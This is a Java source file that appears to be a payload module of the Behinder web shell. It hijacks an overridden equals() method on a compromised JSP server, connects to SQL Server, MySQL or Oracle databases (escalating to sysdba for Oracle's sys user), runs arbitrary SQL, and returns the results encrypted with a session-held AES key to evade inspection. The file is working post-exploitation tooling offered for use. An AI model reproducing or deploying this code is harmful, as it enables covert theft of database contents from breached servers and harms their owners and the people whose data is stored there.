package net.rebeyond.behinder.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.util.*;

public class Database {
    public static String database;
    public static String host;
    public static String pass;
    public static String port;
    public static String sql;
    public static String type;
    public static String user;
    private ServletResponse Response;
    private HttpSession Session;

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        Map<String, String> result = new HashMap<>();
        try {
            executeSQL();
            result.put("msg", executeSQL());
            result.put("status", "success");
        } catch (Exception e) {
            e.printStackTrace();
            result.put("status", "fail");
            if (e instanceof ClassNotFoundException) {
                result.put("msg", "NoDriver");
            } else {
                result.put("msg", e.getMessage());
            }
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return true;
    }

    public String executeSQL() throws Exception {
        String driver = null;
        String url = null;
        if (type.equals("sqlserver")) {
            driver = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
            url = "jdbc:sqlserver://%s:%s;DatabaseName=%s";
        } else if (type.equals("mysql")) {
            driver = "com.mysql.jdbc.Driver";
            url = "jdbc:mysql://%s:%s/%s";
        } else if (type.equals("oracle")) {
            driver = "oracle.jdbc.driver.OracleDriver";
            url = "jdbc:oracle:thin:@%s:%s:%s";
            if (user.equals("sys")) {
                user += " as sysdba";
            }
        }
        String url2 = String.format(url, host, port, database);
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url2, user, pass);
        ResultSet rs = con.createStatement().executeQuery(sql);
        ResultSetMetaData metaData = rs.getMetaData();
        int count = metaData.getColumnCount();
        String[] colNames = new String[count];
        for (int i = 0; i < count; i++) {
            colNames[i] = metaData.getColumnLabel(i + 1);
        }
        String result = "[" + "[";
        for (int i2 = 0; i2 < colNames.length; i2++) {
            result = result + String.format("{\"name\":\"%s\"}", colNames[i2]) + ",";
        }
        String result2 = result.substring(0, result.length() - 1) + "],";
        Map<String, Object> linkedHashMap = new LinkedHashMap<>();
        List<Map<String, Object>> recordList = new ArrayList<>();
        while (rs.next()) {
            String result3 = result2 + "[";
            for (String col : colNames) {
                linkedHashMap.put(col, rs.getObject(col));
                result3 = result3 + "\"" + rs.getObject(col) + "\",";
            }
            recordList.add(linkedHashMap);
            result2 = result3.substring(0, result3.length() - 1) + "],";
        }
        String result4 = result2.substring(0, result2.length() - 1) + "]";
        rs.close();
        con.close();
        return result4;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
}
